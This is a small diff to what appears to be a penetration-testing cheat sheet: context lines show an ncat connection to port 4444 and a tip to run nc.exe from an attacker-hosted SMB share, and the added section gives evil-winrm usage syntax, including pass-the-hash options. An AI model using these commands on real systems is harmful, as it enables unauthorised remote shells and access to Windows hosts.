@@ -63,3 +63,9 @@ ncat -nv <ip_to_connect> 4444
 If netcat exe cant be located try to host own nc.exe
 Command: \\10.10.X.X\\share\nc.exe ****
 ```
+
+## Evil-winrm
+
+```
+Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
+```
